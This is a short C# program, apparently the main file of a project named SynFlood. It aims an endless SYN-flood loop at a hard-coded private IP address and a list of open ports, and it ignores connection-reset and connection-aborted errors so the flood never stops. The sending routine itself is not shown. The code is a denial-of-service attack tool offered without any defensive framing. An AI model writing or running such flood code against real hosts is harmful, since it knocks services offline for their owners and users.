using SynFlood;
using System.Net.Sockets;

var stopApplication = new AutoResetEvent(true);
try
{
    var targetIp = "192.168.0.178";
    var targetOpenPorts = new List<short> { 10101, 8008, 8443, 8009, 9000, 10007, 10005, 10001 };

    while (true)
    {
        try
        {
            SynSender.Send(targetIp, targetOpenPorts);
        }
        catch (SocketException ex)
        {
            if ((ex.SocketErrorCode != SocketError.ConnectionAborted) &&
                (ex.SocketErrorCode != SocketError.ConnectionReset))
            {
                throw;
            }
        }
    }
}
catch (Exception ex)
{
    Console.WriteLine(ex.ToString());
}
finally
{
    stopApplication.Set();
}

stopApplication.WaitOne();
Console.ReadKey();